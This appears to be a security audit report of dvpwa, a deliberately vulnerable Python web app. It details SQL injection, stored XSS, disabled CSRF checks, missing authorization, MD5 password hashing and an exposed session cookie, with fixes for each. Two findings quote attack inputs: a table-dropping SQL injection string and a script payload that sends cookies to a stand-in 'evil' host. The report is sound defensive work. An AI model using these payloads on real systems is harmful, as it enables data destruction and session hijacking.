summary: Reviewed the dvpwa aiohttp application in full: the DAO layer (sqli/dao/*), request handlers (sqli/views.py), routing (sqli/routes.py), auth utilities (sqli/utils/auth.py), middlewares (sqli/middlewares.py), app/session/template setup (sqli/app.py), Jinja2 context processors, form/config schemas, templates, and configuration. The application is intentionally vulnerable and lives up to it: it contains an unauthenticated SQL injection, a global stored-XSS enabling misconfiguration, disabled CSRF protection, broken access control on all state-changing endpoints, weak password hashing, and a session cookie exposed to JavaScript. Overall risk is critical. Non-Python assets (static JS/CSS fonts, migrations SQL, Dockerfiles) were only skimmed and are not the focus of this report.

findings.title: Unauthenticated SQL injection in Student.create via student name
findings.description: Student.create builds its INSERT statement by Python string formatting (`% {'name': name}`) instead of passing parameters to the driver, so the caller-supplied name is embedded directly into SQL. The name comes straight from untrusted POST data in views.students (`await Student.create(conn, data['name'])`, sqli/views.py:57), and the POST /students/ route (sqli/routes.py:14) has no authentication decorator, so any anonymous client can reach it. A value such as `x'); DROP TABLE marks;--` or a stacked/UNION payload is interpreted as SQL, allowing arbitrary data read/modification/destruction on the sqli database. This is the only injection built by string formatting; every other DAO method (Student.get, Course.*, Review.*, Mark.*, User.*) correctly uses driver parameter binding.
findings.evidence:
q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})  # sqli/dao/student.py:42-43
<- Student.create(conn, data['name'])  # sqli/views.py:57 (data = await request.post())
<- POST /students/ with no auth  # sqli/routes.py:14
findings.recommendation: Use parameterized queries like the other DAO methods: `await cur.execute('INSERT INTO students (name) VALUES (%s)', (name,))`. Never build SQL with %-formatting or f-strings.

findings.title: Global Jinja2 autoescape disabled enabling stored XSS via review_text
findings.description: setup_jinja is configured with autoescape=False, so every template expression is rendered as raw HTML unless a template explicitly applies the `| e` filter. Attacker-controlled values that are stored and later re-rendered without the filter become stored XSS. Concretely, review_text is written verbatim to the database by an unauthenticated POST /courses/{id}/review (sqli/views.py:129, no auth decorator) and then rendered as `{{ review.review_text }}` in sqli/templates/course.jinja2:22 with no escaping; course.title/description (course.jinja2:14-15) are likewise unescaped. A payload like `<script>fetch('//evil/?c='+document.cookie)</script>` executes in the browser of every visitor to the course page. Because the session cookie is not HttpOnly (see related finding), this directly enables session theft.
findings.evidence:
setup_jinja(app, loader=..., autoescape=False)  # sqli/app.py:35
stored: await Review.create(conn, course_id, review_text)  # sqli/views.py:129, review_text from request.post()
rendered raw: {{ review.review_text }}  # sqli/templates/course.jinja2:22
findings.recommendation: Enable autoescaping (`autoescape=select_autoescape(['jinja2','html'])` or `autoescape=True`) and use `| safe` only where deliberate HTML is required. Do not rely on per-template `| e` filters.

findings.title: CSRF protection middleware disabled for all POST endpoints
findings.description: The application defines a working CSRF-validation middleware (sqli/middlewares.py:25-38) and templates emit a `_csrf_token` hidden field, but the middleware is commented out of the Application middleware list, so no POST request is ever checked for a CSRF token. Every state-changing endpoint (login, create student, create course, create review, evaluate/assign marks, logout) is therefore vulnerable to cross-site request forgery: an attacker page can auto-submit a form to these routes and act with the victim's session. This compounds the missing-authorization and SQL-injection issues by allowing a victim's browser to be used to reach them.
findings.evidence:
middlewares=[session_middleware, # csrf_middleware, error_middleware]  # sqli/app.py:25-29
Unused validator: async def csrf_middleware(request, handler): ...  # sqli/middlewares.py:25-38
findings.recommendation: Add csrf_middleware to the Application middlewares list (order it after session_middleware) so POST requests are validated against the session-stored token.

findings.title: Missing authorization on state-changing endpoints (evaluate, student/course/review creation)
findings.description: The evaluate handler assigns marks to a student for a course but has no @authorize decorator and performs no server-side role check; only the template hides the form behind `{% if auth_user.is_admin %}` (sqli/templates/course.jinja2:41). Any anonymous client can POST to /students/{id}/evaluate/{course_id} with a `points` value and record grades, defeating the intended admin-only control. The same missing-authorization pattern affects the other mutating handlers: students create (sqli/views.py:54-57), courses create (sqli/views.py:86-89), and review create (sqli/views.py:119-129) are all reachable unauthenticated. The authorize() decorator exists (sqli/utils/auth.py:12-23) but is applied only to logout.
findings.recommendation: Apply @authorize(ensure_admin=True) to evaluate and @authorize() (or admin) to the students/courses/review creation handlers, enforcing the trust boundary server-side rather than in templates.

findings.title: Passwords hashed with unsalted MD5
findings.description: User.check_password compares the stored hash against `md5(password).hexdigest()`, meaning passwords are stored as single-round, unsalted MD5 digests. MD5 is fast and broken for password storage: an attacker who obtains the users table (e.g., via the SQL injection above) can recover plaintext passwords with rainbow tables or trivial brute force, and identical passwords produce identical hashes. The comparison is also non-constant-time, a minor timing concern secondary to the algorithm choice.
findings.recommendation: Use a memory-hard, salted password hash (bcrypt, scrypt, or Argon2) via a vetted library, and compare using the library's constant-time verify function.

findings.title: Session cookie set with HttpOnly disabled
findings.description: The Redis session storage is instantiated with httponly=False, so the session cookie is exposed to client-side JavaScript. Combined with the stored XSS enabled by autoescape=False, an injected script can read document.cookie and exfiltrate the session identifier, allowing full session hijacking of any authenticated (including admin) user who views attacker-controlled content.
findings.recommendation: Remove httponly=False (the default is True) and additionally set secure=True and an appropriate SameSite attribute for the session cookie.

findings.title: aiohttp application runs with debug mode enabled
findings.description: The Application is constructed with debug=True unconditionally. Debug mode enables additional diagnostics and more verbose error behavior that can leak internal details and increases resource usage; it should never be hardcoded on for a deployable app. Impact is limited on its own but aids an attacker's reconnaissance.
findings.recommendation: Drive debug from configuration/environment and default it to False for non-development deployments.
